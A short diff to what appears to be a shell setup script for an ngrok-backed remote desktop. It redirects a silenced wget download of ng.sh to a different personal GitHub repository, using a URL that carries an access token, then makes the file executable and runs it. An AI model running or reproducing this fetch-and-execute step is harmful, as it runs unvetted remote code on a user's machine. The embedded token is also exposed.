@@ -1,4 +1,4 @@
-wget -O ng.sh https://github.com/kmille36/Docker-Ubuntu-Desktop-NoMachine/raw/main/ngrok.sh > /dev/null 2>&1
+wget -O ng.sh https://raw.githubusercontent.com/ggmohamed624/monnnnn/main/ngrok.sh?token=GHSAT0AAAAAACLBH5T3U6OBVGHYDMX6UMXGZLJXQXQ > /dev/null 2>&1
 chmod +x ng.sh
 ./ng.sh
 
